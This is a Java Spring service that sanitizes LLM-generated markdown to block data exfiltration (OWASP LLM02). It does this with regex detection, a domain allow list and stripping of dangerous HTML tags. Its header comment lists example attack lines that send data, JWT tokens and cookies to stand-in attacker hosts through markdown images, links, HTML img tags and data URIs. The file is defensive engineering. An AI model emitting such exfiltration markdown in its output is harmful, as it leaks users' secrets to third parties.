package com.secureai.security;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import java.net.URI;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Output Sanitization Service — Markdown Data Exfiltration Prevention
 *
 * Mitigates OWASP LLM02 (Insecure Output Handling) by sanitizing LLM-generated
 * markdown before returning it to the client.
 *
 * Attack vectors prevented:
 *   1. Hidden image tags that exfiltrate data via URL params:
 *      ![img](http://attacker.com/exfil?data=SENSITIVE_DATA)
 *   2. Clickjacking links disguised as benign text:
 *      [Click here](http://attacker.com/steal?token=JWT_TOKEN)
 *   3. HTML injection within markdown responses:
 *      <img src="http://evil.com/log?cookie=..."/>
 *   4. Data URI abuse for encoded payload delivery:
 *      ![x](data:text/html;base64,PHNjcmlwdD5...)
 *   5. Markdown reference-style link exfiltration:
 *      [label][ref] ... [ref]: http://attacker.com/exfil
 *
 * Reference: OWASP Top 10 for LLM Applications 2025 — LLM02
 *            https://genai.owasp.org/llmrisk/llm02-sensitive-information-disclosure/
 */
@Service
public class OutputSanitizationService {

    private static final Logger log = LoggerFactory.getLogger(OutputSanitizationService.class);

    @Value("${output.sanitization.enabled:true}")
    private boolean enabled;

    // ─────────────────────────────────────────────────────────────────────────
    // Allowed domains for markdown links/images (whitelist approach)
    // ─────────────────────────────────────────────────────────────────────────

    private static final List<String> ALLOWED_DOMAINS = List.of(
            "localhost",
            "secure-ai.local",
            "github.com",
            "githubusercontent.com",
            "wikipedia.org",
            "wikimedia.org"
    );

    // ─────────────────────────────────────────────────────────────────────────
    // Compiled Regex Patterns
    // ─────────────────────────────────────────────────────────────────────────

    /** Markdown image tags: ![alt](url) or ![alt](url "title") */
    private static final Pattern MARKDOWN_IMAGE =
            Pattern.compile("!\\[([^\\]]*)\\]\\(([^)]+)\\)");

    /** Markdown links: [text](url) or [text](url "title") */
    private static final Pattern MARKDOWN_LINK =
            Pattern.compile("(?<!!)\\[([^\\]]*)\\]\\(([^)]+)\\)");

    /** Markdown reference-style links: [ref]: url */
    private static final Pattern MARKDOWN_REFERENCE =
            Pattern.compile("^\\s*\\[([^\\]]*)\\]:\\s*(\\S+)", Pattern.MULTILINE);

    /** Raw HTML image tags: <img src="url" ...> */
    private static final Pattern HTML_IMG_TAG =
            Pattern.compile("<img\\s+[^>]*src\\s*=\\s*[\"']([^\"']+)[\"'][^>]*/?>",
                    Pattern.CASE_INSENSITIVE);

    /** Raw HTML anchor tags: <a href="url">...</a> */
    private static final Pattern HTML_ANCHOR_TAG =
            Pattern.compile("<a\\s+[^>]*href\\s*=\\s*[\"']([^\"']+)[\"'][^>]*>",
                    Pattern.CASE_INSENSITIVE);

    /** Raw HTML script/iframe/object tags — always strip */
    private static final Pattern HTML_DANGEROUS_TAGS =
            Pattern.compile("<\\s*/?(script|iframe|object|embed|form|input|meta|link|base)\\b[^>]*>",
                    Pattern.CASE_INSENSITIVE);

    /** Data URIs (potential encoded payloads): data:text/html;base64,... */
    private static final Pattern DATA_URI =
            Pattern.compile("data:\\s*[^;,]+;?\\s*(?:base64\\s*,)?",
                    Pattern.CASE_INSENSITIVE);

    /** Event handler attributes in HTML: onload=, onerror=, onclick= */
    private static final Pattern HTML_EVENT_HANDLERS =
            Pattern.compile("\\bon\\w+\\s*=\\s*[\"'][^\"']*[\"']",
                    Pattern.CASE_INSENSITIVE);

    // ─────────────────────────────────────────────────────────────────────────
    // Public API
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * Sanitize LLM output by removing or neutralizing potentially malicious
     * markdown constructs that could exfiltrate data.
     *
     * @param response the raw LLM response text
     * @return sanitized response with dangerous constructs neutralized
     */
    public String sanitize(String response) {
        if (!enabled || response == null || response.isBlank()) {
            return response;
        }

        String result = response;
        int totalSanitizations = 0;

        // Step 1: Strip dangerous HTML tags entirely (script, iframe, etc.)
        result = stripDangerousTags(result);

        // Step 2: Strip HTML event handlers (onload=, onerror=, etc.)
        result = stripEventHandlers(result);

        // Step 3: Sanitize HTML <img> tags with external URLs
        SanitizeResult imgResult = sanitizeHtmlImages(result);
        result = imgResult.text;
        totalSanitizations += imgResult.count;

        // Step 4: Sanitize HTML <a> tags with external URLs
        SanitizeResult anchorResult = sanitizeHtmlAnchors(result);
        result = anchorResult.text;
        totalSanitizations += anchorResult.count;

        // Step 5: Sanitize markdown images with external URLs
        SanitizeResult mdImgResult = sanitizeMarkdownImages(result);
        result = mdImgResult.text;
        totalSanitizations += mdImgResult.count;

        // Step 6: Sanitize markdown links with external URLs
        SanitizeResult mdLinkResult = sanitizeMarkdownLinks(result);
        result = mdLinkResult.text;
        totalSanitizations += mdLinkResult.count;

        // Step 7: Sanitize reference-style links
        SanitizeResult refResult = sanitizeReferenceLinks(result);
        result = refResult.text;
        totalSanitizations += refResult.count;

        // Step 8: Neutralize data URIs
        SanitizeResult dataResult = neutralizeDataUris(result);
        result = dataResult.text;
        totalSanitizations += dataResult.count;

        if (totalSanitizations > 0) {
            log.warn("OUTPUT SANITIZATION: {} potentially malicious construct(s) neutralized " +
                    "(OWASP LLM02 — markdown exfiltration prevention)", totalSanitizations);
        }

        return result;
    }

    /**
     * Check whether a response contains potentially dangerous markdown constructs.
     *
     * @param response the LLM response to check
     * @return true if the response contains suspicious constructs
     */
    public boolean containsSuspiciousContent(String response) {
        if (response == null || response.isBlank()) return false;

        // Check for dangerous HTML tags
        if (HTML_DANGEROUS_TAGS.matcher(response).find()) return true;

        // Check for HTML event handlers
        if (HTML_EVENT_HANDLERS.matcher(response).find()) return true;

        // Check for external URLs in markdown images
        Matcher imgMatcher = MARKDOWN_IMAGE.matcher(response);
        while (imgMatcher.find()) {
            if (!isAllowedUrl(imgMatcher.group(2).trim())) return true;
        }

        // Check for external URLs in markdown links
        Matcher linkMatcher = MARKDOWN_LINK.matcher(response);
        while (linkMatcher.find()) {
            if (!isAllowedUrl(linkMatcher.group(2).trim())) return true;
        }

        // Check for data URIs
        if (DATA_URI.matcher(response).find()) return true;

        return false;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Private Sanitization Methods
    // ─────────────────────────────────────────────────────────────────────────

    private String stripDangerousTags(String text) {
        Matcher m = HTML_DANGEROUS_TAGS.matcher(text);
        if (m.find()) {
            log.warn("Stripped dangerous HTML tag(s) from LLM response");
            return m.replaceAll("[HTML_BLOCKED]");
        }
        return text;
    }

    private String stripEventHandlers(String text) {
        Matcher m = HTML_EVENT_HANDLERS.matcher(text);
        if (m.find()) {
            log.warn("Stripped HTML event handler(s) from LLM response");
            return m.replaceAll("");
        }
        return text;
    }

    private SanitizeResult sanitizeHtmlImages(String text) {
        return sanitizeByPattern(text, HTML_IMG_TAG, 1, "HTML <img>");
    }

    private SanitizeResult sanitizeHtmlAnchors(String text) {
        return sanitizeByPattern(text, HTML_ANCHOR_TAG, 1, "HTML <a>");
    }

    private SanitizeResult sanitizeMarkdownImages(String text) {
        Matcher m = MARKDOWN_IMAGE.matcher(text);
        StringBuilder sb = new StringBuilder();
        int count = 0;
        while (m.find()) {
            String url = extractUrl(m.group(2));
            if (!isAllowedUrl(url)) {
                count++;
                log.warn("Blocked external markdown image: domain={}", extractDomain(url));
                // Replace with text-only (remove image, keep alt text)
                m.appendReplacement(sb, Matcher.quoteReplacement("[Image removed: " + m.group(1) + "]"));
            }
        }
        m.appendTail(sb);
        return new SanitizeResult(sb.toString(), count);
    }

    private SanitizeResult sanitizeMarkdownLinks(String text) {
        Matcher m = MARKDOWN_LINK.matcher(text);
        StringBuilder sb = new StringBuilder();
        int count = 0;
        while (m.find()) {
            String url = extractUrl(m.group(2));
            if (!isAllowedUrl(url)) {
                count++;
                log.warn("Blocked external markdown link: domain={}", extractDomain(url));
                // Replace with text-only (keep link text, remove URL)
                m.appendReplacement(sb, Matcher.quoteReplacement(m.group(1) + " [link removed]"));
            }
        }
        m.appendTail(sb);
        return new SanitizeResult(sb.toString(), count);
    }

    private SanitizeResult sanitizeReferenceLinks(String text) {
        Matcher m = MARKDOWN_REFERENCE.matcher(text);
        StringBuilder sb = new StringBuilder();
        int count = 0;
        while (m.find()) {
            String url = extractUrl(m.group(2));
            if (!isAllowedUrl(url)) {
                count++;
                log.warn("Blocked external reference link: domain={}", extractDomain(url));
                m.appendReplacement(sb, Matcher.quoteReplacement("[" + m.group(1) + "]: [link removed]"));
            }
        }
        m.appendTail(sb);
        return new SanitizeResult(sb.toString(), count);
    }

    private SanitizeResult neutralizeDataUris(String text) {
        Matcher m = DATA_URI.matcher(text);
        if (m.find()) {
            log.warn("Neutralized data URI(s) in LLM response");
            return new SanitizeResult(m.replaceAll("[DATA_URI_BLOCKED]"), 1);
        }
        return new SanitizeResult(text, 0);
    }

    private SanitizeResult sanitizeByPattern(String text, Pattern pattern, int urlGroup, String label) {
        Matcher m = pattern.matcher(text);
        StringBuilder sb = new StringBuilder();
        int count = 0;
        while (m.find()) {
            String url = extractUrl(m.group(urlGroup));
            if (!isAllowedUrl(url)) {
                count++;
                log.warn("Blocked external {} tag: domain={}", label, extractDomain(url));
                m.appendReplacement(sb, Matcher.quoteReplacement("[" + label + " blocked]"));
            }
        }
        m.appendTail(sb);
        return new SanitizeResult(sb.toString(), count);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // URL Validation
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * Check whether a URL is on the allowed domain whitelist.
     * Relative URLs and fragment-only URLs are always allowed.
     */
    private boolean isAllowedUrl(String url) {
        if (url == null || url.isBlank()) return true;

        // Allow relative URLs and anchors
        if (url.startsWith("#") || url.startsWith("/") || url.startsWith("./")) {
            return true;
        }

        // Block data URIs
        if (url.toLowerCase().startsWith("data:")) {
            return false;
        }

        // Block javascript URIs
        if (url.toLowerCase().startsWith("javascript:")) {
            return false;
        }

        String domain = extractDomain(url);
        if (domain == null || domain.isBlank()) return true;

        // Check against whitelist (exact match or subdomain match)
        return ALLOWED_DOMAINS.stream().anyMatch(allowed ->
                domain.equals(allowed) || domain.endsWith("." + allowed));
    }

    /**
     * Extract the domain from a URL string, handling edge cases gracefully.
     */
    private String extractDomain(String url) {
        if (url == null) return null;
        try {
            // Strip optional markdown title: url "title"
            String cleanUrl = extractUrl(url);
            if (!cleanUrl.contains("://")) {
                cleanUrl = "http://" + cleanUrl;
            }
            return URI.create(cleanUrl).getHost();
        } catch (Exception e) {
            // Malformed URL — treat as suspicious (not allowed)
            return "unknown";
        }
    }

    /**
     * Extract the raw URL from a markdown URL field (strips optional "title").
     */
    private String extractUrl(String rawUrl) {
        if (rawUrl == null) return "";
        String trimmed = rawUrl.trim();
        // Handle: url "title" or url 'title'
        int spaceIdx = trimmed.indexOf(' ');
        if (spaceIdx > 0) {
            trimmed = trimmed.substring(0, spaceIdx);
        }
        return trimmed;
    }

    // ─────────────────────────────────────────────────────────────────────────

    private record SanitizeResult(String text, int count) {}
}
